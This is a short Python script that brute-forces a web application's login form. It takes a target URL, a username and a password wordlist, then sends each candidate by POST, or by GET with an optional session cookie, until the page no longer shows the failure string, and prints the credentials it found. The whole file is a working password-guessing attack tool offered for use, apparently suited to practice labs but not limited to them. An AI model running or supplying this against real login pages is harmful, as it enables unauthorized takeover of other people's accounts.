import requests #to automate the process of sending the get and post requests
from termcolor import colored

url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For The Account To Bruteforce: ')
password_file = input('[+] Enter Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('Enter Cookie Value(Optional): ')

def cracking(username,url):
	for password in passwords:
		password = password.strip() #remove empty characters
		print(colored(('Trying: ' + password), 'red'))
		data = {'username':username,'password':password,'Login':'submit'}
		if cookie_value != '':
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else:
			response = requests.post(url, data=data) #send the login codes to the web page url
		if login_failed_string in response.content.decode(): #if web app says login codes failed
			pass
		else: #display the successful login codes
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			exit()

with open(password_file, 'r') as passwords:
	cracking(username,url)

print('[!!] Password Not In List')


